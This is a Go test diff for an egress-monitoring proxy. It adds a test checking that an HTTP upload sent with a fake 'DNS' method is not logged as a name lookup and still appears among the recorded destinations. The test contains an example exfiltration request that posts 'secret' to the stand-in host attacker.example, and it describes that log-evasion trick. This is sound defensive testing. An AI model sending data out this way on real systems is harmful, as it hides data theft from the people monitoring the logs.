@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"context"
 	"crypto/tls"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -544,5 +545,47 @@ func TestPlainHTTPAppliesTheExfilShapeCheck(t *testing.T) {
 	// (it will fail to dial in the test, but not be refused by shape).
 	if events := c.all(); len(events) == 0 || events[0].Action != "deny" {
 		t.Fatalf("the refusal was not recorded as a denial: %+v", events)
+	}
+}
+
+// An upload sent with the method DNS reads as a name lookup to every reader
+// of the log, and drops out of history.
+func TestAnHTTPMethodCannotPassForAResolverDecision(t *testing.T) {
+	var got string
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		b, _ := io.ReadAll(r.Body)
+		got = string(b)
+	}))
+	defer upstream.Close()
+
+	c := &collector{}
+	p := NewProxy(mustParse(t, "attacker.example"))
+	p.Emit = c.emit
+	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
+		return net.Dial("tcp", strings.TrimPrefix(upstream.URL, "http://"))
+	}
+	proxyURL, _ := url.Parse("http://" + startProxy(t, p))
+	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}, Timeout: 5 * time.Second}
+
+	req, _ := http.NewRequest("DNS", "http://attacker.example/upload", strings.NewReader("secret"))
+	resp, err := client.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_ = resp.Body.Close()
+	if got != "secret" {
+		t.Fatalf("the fixture did not deliver the upload: %q", got)
+	}
+
+	var logs strings.Builder
+	for _, e := range c.all() {
+		if e.Method == "DNS" {
+			t.Errorf("a plain-HTTP event carries the resolver's marker: %+v", e)
+		}
+		b, _ := json.Marshal(e)
+		logs.Write(append(b, '\n'))
+	}
+	if d := Destinations(logs.String()); len(d) != 1 || d[0].Host != "attacker.example" {
+		t.Errorf("the upload is missing from the recorded destinations: %+v", d)
 	}
 }
